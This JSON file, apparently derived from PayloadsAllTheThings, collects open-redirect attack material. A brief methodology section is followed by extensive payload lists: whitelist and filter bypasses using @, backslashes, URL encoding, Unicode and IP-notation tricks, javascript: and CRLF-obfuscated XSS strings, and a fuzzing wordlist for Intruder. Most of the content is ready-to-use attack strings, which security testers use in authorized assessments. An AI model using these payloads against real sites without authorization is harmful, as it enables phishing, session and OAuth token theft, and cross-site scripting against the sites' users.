{
  "category": "Open Redirect",
  "source": "PayloadsAllTheThings/Open Redirect/",
  "entries": [
    {
      "subcategory": "Methodology",
      "title": "What Open Redirect is",
      "language": "text",
      "tags": ["methodology", "concept"],
      "body": "An Open Redirect occurs when an application uses unvalidated user input to redirect the user to another site. The attacker crafts a link to the vulnerable (trusted) domain that redirects the victim to a malicious resource under the attacker's control.\n\nThe server name in the link matches the real site, so the phishing looks plausible. It is used in phishing, theft of sessions/tokens (via the OAuth redirect_uri), and also to bypass access checks and forward to privileged functions.\n\nExample of a vulnerable redirect:\nhttps://example.com/redirect?url=https://userpreferredsite.com\nThe attacker replaces userpreferredsite.com with their own domain and sends the link out in phishing."
    },
    {
      "subcategory": "Methodology",
      "title": "Where to look and how to test",
      "language": "text",
      "tags": ["methodology", "recon", "how-to-test"],
      "body": "• Any parameter with a URL value or a path: url, next, redirect, return, dest, continue, callback, redirect_uri (OAuth/OIDC/SSO).\n• Logout/login flows, \"go back\" buttons, a saved home page, shortlinks, tracking redirects.\n• The redirect can be on the server (Location header, 3xx codes) or on the client (window.location, meta refresh, a JS variable) - DOM-based.\n• Substitute your own domain and watch: did Location go / did the browser navigate to the foreign host.\n• If there is a whitelist - try bypasses: //, @, your domain as a subfolder/subdomain of the trusted one, backslash, triple slash, URL-encoded dot/slash, null byte, IP in non-standard notations, Unicode normalization.\n• Chains: Open Redirect -> stealing an OAuth token/code, bypassing SSRF filters, chaining with XSS via javascript:/data:."
    },
    {
      "subcategory": "Methodology",
      "title": "HTTP redirect codes (3xx)",
      "language": "table",
      "tags": ["methodology", "http", "status-code"],
      "body": "",
      "meta": {
        "kind": "table",
        "table": {
          "headers": ["Code", "Purpose"],
          "rows": [
            ["300 Multiple Choices", "The request has several possible responses, the client picks one"],
            ["301 Moved Permanently", "The resource has moved permanently to the URL in the Location header"],
            ["302 Found", "The resource is temporarily at the URL from Location (the method may change)"],
            ["303 See Other", "Get the resource at another URI via GET"],
            ["304 Not Modified", "Cache: the response has not changed, use the saved version"],
            ["305 Use Proxy", "Access the resource through the proxy from the Location header"],
            ["307 Temporary Redirect", "Temporary redirect to the URL from Location, the method is preserved"],
            ["308 Permanent Redirect", "Permanent redirect to the URL from Location, the method is preserved"]
          ]
        }
      }
    },
    {
      "subcategory": "Methodology",
      "title": "Redirect methods: path and JavaScript",
      "language": "text",
      "tags": ["methodology", "path-based", "dom-based"],
      "body": "Path-based - the redirect logic is taken from the path, not from the query:\nhttps://example.com/redirect/http://malicious.com\nhttps://example.com/redirect/../http://malicious.com\n\nJavaScript-based (DOM) - the application redirects via JS, we manipulate the variable:\nvar redirectTo = \"http://trusted.com\";\nwindow.location = redirectTo;\nPayload: ?redirectTo=http://malicious.com"
    },
    {
      "subcategory": "Parameters",
      "title": "Common query parameters for a redirect",
      "language": "text",
      "tags": ["parameters", "fuzzing", "query"],
      "body": "?checkout_url={payload}\n?continue={payload}\n?dest={payload}\n?destination={payload}\n?go={payload}\n?image_url={payload}\n?next={payload}\n?redir={payload}\n?redirect_uri={payload}\n?redirect_url={payload}\n?redirect={payload}\n?return_path={payload}\n?return_to={payload}\n?return={payload}\n?returnTo={payload}\n?rurl={payload}\n?target={payload}\n?url={payload}\n?view={payload}\n/{payload}\n/redirect/{payload}"
    },
    {
      "subcategory": "Basic",
      "title": "Protocol-relative (//) and \"http\" bypass",
      "language": "text",
      "tags": ["basic", "protocol-relative", "filter-bypass"],
      "body": "//google.com\n////google.com"
    },
    {
      "subcategory": "Basic",
      "title": "https: without slashes - bypass of the \"//\" filter",
      "language": "text",
      "tags": ["basic", "scheme", "filter-bypass"],
      "body": "https:google.com"
    },
    {
      "subcategory": "Basic",
      "title": "Basic redirects to an external host",
      "language": "text",
      "tags": ["basic", "payload"],
      "body": "/http://example.com\n/http:/example.com\n//example.com\n//example.com/\n///example.com\n///example.com/\n/////example.com\n/////example.com/"
    },
    {
      "subcategory": "Whitelist bypass",
      "title": "Subdomain/subfolder as the trusted domain",
      "language": "text",
      "tags": ["whitelist-bypass", "phishing"],
      "body": "www.whitelisted.com.evil.com   redirects to evil.com\n\n# Trusted domain as a folder/path prefix (the host stays yours):\nhttp://www.yoursite.com/http://www.theirsite.com/\nhttp://www.yoursite.com/folder/www.folder.com"
    },
    {
      "subcategory": "Whitelist bypass",
      "title": "The @ character - the real host comes after @ (RFC 1738)",
      "language": "text",
      "tags": ["whitelist-bypass", "at-sign", "userinfo"],
      "body": "//<user>:<password>@<host>:<port>/<url-path>\nhttp://www.theirsite.com@yoursite.com/"
    },
    {
      "subcategory": "Whitelist bypass",
      "title": "The ? character - the browser treats it as /?",
      "language": "text",
      "tags": ["whitelist-bypass", "question-mark"],
      "body": "http://www.yoursite.com?http://www.theirsite.com/\nhttp://www.yoursite.com?folder/www.folder.com"
    },
    {
      "subcategory": "Whitelist bypass",
      "title": "Whitelist domain + @ / # / & / \\ before the real host",
      "language": "text",
      "tags": ["whitelist-bypass", "at-sign", "parsing"],
      "body": "http://google.com:80#@www.whitelisteddomain.tld/\nhttp://google.com:80?@www.whitelisteddomain.tld/\nhttp://google.com\\www.whitelisteddomain.tld\nhttp://google.com&www.whitelisteddomain.tld\nhttp://www.whitelisteddomain.tld.google.com\nhttp://www.whitelisteddomain.tld/https://www.google.com/\n//google.com\\@www.whitelisteddomain.tld\nhttps://:@google.com\\@www.whitelisteddomain.tld"
    },
    {
      "subcategory": "Whitelist bypass",
      "title": "HTTP Parameter Pollution",
      "language": "text",
      "tags": ["whitelist-bypass", "hpp", "parameter-pollution"],
      "body": "?next=whitelisted.com&next=google.com"
    },
    {
      "subcategory": "Filter bypass",
      "title": "Backslash tricks - bypass of the \"//\" filter",
      "language": "text",
      "tags": ["filter-bypass", "backslash"],
      "body": "\\/\\/google.com/\n/\\/google.com/\n\\\\google.com"
    },
    {
      "subcategory": "Filter bypass",
      "title": "Encoded backslash (%5c) + slash combinations",
      "language": "text",
      "tags": ["filter-bypass", "backslash", "url-encode"],
      "body": "/%5cexample.com\n//%5cexample.com\n///%5cexample.com\n////%5cexample.com\nhttps://%5cgoogle.com\n/https://%5cgoogle.com\n/https:/%5cexample.com/"
    },
    {
      "subcategory": "Filter bypass",
      "title": "Triple/multiple slash + path-traversal suffix",
      "language": "text",
      "tags": ["filter-bypass", "triple-slash", "path-traversal"],
      "body": "///google.com/%2f..\n////google.com/%2f..\n//example.com/%2f%2e%2e\n///example.com/%2f%2e%2e\n////example.com/%2f%2e%2e\n//example.com/%2e%2e\n//example.com/%2e%2e%2f\n//example.com//\n///example.com//\n////example.com//\nhttps:///www.google.com/%2e%2e\nhttps:///www.google.com/%2f%2e%2e"
    },
    {
      "subcategory": "Filter bypass",
      "title": "Encoded TAB (%09) inside the host",
      "language": "text",
      "tags": ["filter-bypass", "url-encode", "whitespace"],
      "body": "/%09/google.com\n//%09/google.com\n///%09/google.com\n////%09/google.com\nhttps://%09/google.com\n/https://%09/example.com"
    },
    {
      "subcategory": "Filter bypass",
      "title": "URL-encode the whole payload - bypass of keyword filters",
      "language": "text",
      "tags": ["filter-bypass", "url-encode", "obfuscation"],
      "body": "# %68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d = http://google.com\n%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d\nhttp://%67%6f%6f%67%6c%65%2e%63%6f%6d\n/http://%67%6f%6f%67%6c%65%2e%63%6f%6d\n/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d\n/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/"
    },
    {
      "subcategory": "Filter bypass",
      "title": "Ideographic dot %E3%80%82 - bypass of the \".\" filter",
      "language": "text",
      "tags": ["filter-bypass", "unicode", "ideographic-dot"],
      "body": "/?redir=google。com\n//google%E3%80%82com"
    },
    {
      "subcategory": "Filter bypass",
      "title": "Null byte %00 - bypass of a blacklist filter",
      "language": "text",
      "tags": ["filter-bypass", "null-byte"],
      "body": "//google%00.com"
    },
    {
      "subcategory": "Filter bypass",
      "title": "Host/Split Unicode Normalization",
      "language": "text",
      "tags": ["filter-bypass", "unicode", "normalization"],
      "body": "https://evil.c℀.example.com   --->   https://evil.ca/c.example.com\nhttp://a.com／X.b.com"
    },
    {
      "subcategory": "Filter bypass",
      "title": "Unicode characters that normalize to a dot/slash",
      "language": "text",
      "tags": ["filter-bypass", "unicode", "idna"],
      "body": "〱google.com\n〵google.com\nゝgoogle.com\nーgoogle.com\nｰgoogle.com\n/〱google.com\n/〵google.com\n/ゝgoogle.com\n/ーgoogle.com\n/ｰgoogle.com"
    },
    {
      "subcategory": "CRLF and schemes",
      "title": "CRLF to bypass the \"javascript\" filter",
      "language": "text",
      "tags": ["crlf", "filter-bypass", "javascript"],
      "body": "java%0d%0ascript%0d%0a:alert(0)"
    },
    {
      "subcategory": "CRLF and schemes",
      "title": "javascript: scheme - XSS via redirect",
      "language": "text",
      "tags": ["javascript", "xss", "scheme"],
      "body": "javascript:alert(1);\njavascript:alert(1)\n//javascript:alert(1);\n/javascript:alert(1);\n//javascript:alert(1)\n/javascript:alert(1)\n/%5cjavascript:alert(1);\n//%5cjavascript:alert(1);\n/%09/javascript:alert(1);\n<>javascript:alert(1);"
    },
    {
      "subcategory": "CRLF and schemes",
      "title": "javascript: with obfuscation (CRLF, escape, octal/unicode)",
      "language": "text",
      "tags": ["javascript", "xss", "obfuscation"],
      "body": "javascript://www.whitelisteddomain.tld?%a0alert%281%29\n\";alert(0);//\n\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3aalert(1)\n\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003aalert(1)\nja\\nva\\tscript\\r:alert(1)\n\\j\\av\\a\\s\\cr\\i\\pt\\:\\a\\l\\ert\\(1\\)\n\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\072alert(1)"
    },
    {
      "subcategory": "IP notations",
      "title": "Host in non-standard IP notations (decimal/hex/octal/IPv6)",
      "language": "text",
      "tags": ["ip-encoding", "whitelist-bypass", "ssrf"],
      "body": "# All variants below = 216.58.214.206\nhttp://0xd8.0x3a.0xd6.0xce\nhttp://0xd83ad6ce\nhttp://3627734734\nhttp://472.314.470.462\nhttp://0330.072.0326.0316\nhttp://00330.00072.0000326.00000316\nhttp://[::216.58.214.206]\nhttp://[::ffff:216.58.214.206]\nhttp://0xd8.072.54990\nhttp://0xd8.3856078\nhttp://00330.3856078\nhttp://00330.0x3a.54990"
    },
    {
      "subcategory": "IP notations",
      "title": "IP notations with a whitelist domain in userinfo (@)",
      "language": "text",
      "tags": ["ip-encoding", "at-sign", "whitelist-bypass"],
      "body": "http://www.whitelisteddomain.tld@0xd8.0x3a.0xd6.0xce\nhttp://www.whitelisteddomain.tld@0xd83ad6ce\nhttp://www.whitelisteddomain.tld@3627734734\nhttp://www.whitelisteddomain.tld@472.314.470.462\nhttp://www.whitelisteddomain.tld@0330.072.0326.0316\nhttp://www.whitelisteddomain.tld@[::216.58.214.206]\nhttp://www.whitelisteddomain.tld@[::ffff:216.58.214.206]"
    },
    {
      "subcategory": "IP notations",
      "title": "IP notations with http: scheme without // (bypass of \"//\")",
      "language": "text",
      "tags": ["ip-encoding", "scheme", "filter-bypass"],
      "body": "http:0xd8.0x3a.0xd6.0xce\nhttp:0xd83ad6ce\nhttp:3627734734\nhttp:472.314.470.462\nhttp:0330.072.0326.0316\nhttp:[::216.58.214.206]\nhttp:[::ffff:216.58.214.206]"
    },
    {
      "subcategory": "Ready-made lists",
      "title": "Whitelist bypass with @ and %2f.. suffix (for Intruder)",
      "language": "text",
      "tags": ["wordlist", "whitelist-bypass", "intruder"],
      "body": "//google.com/%2f..\n//www.whitelisteddomain.tld@google.com/%2f..\n///google.com/%2f..\n///www.whitelisteddomain.tld@google.com/%2f..\n////google.com/%2f..\n////www.whitelisteddomain.tld@google.com/%2f..\nhttps://google.com/%2f..\nhttps://www.whitelisteddomain.tld@google.com/%2f..\n/https://google.com/%2f..\n/https://www.whitelisteddomain.tld@google.com/%2f..\n//google.com/\n//www.whitelisteddomain.tld@google.com/\nhttps://google.com/\nhttps://www.whitelisteddomain.tld@google.com/\nhttps://google.com\nhttps://www.whitelisteddomain.tld@google.com"
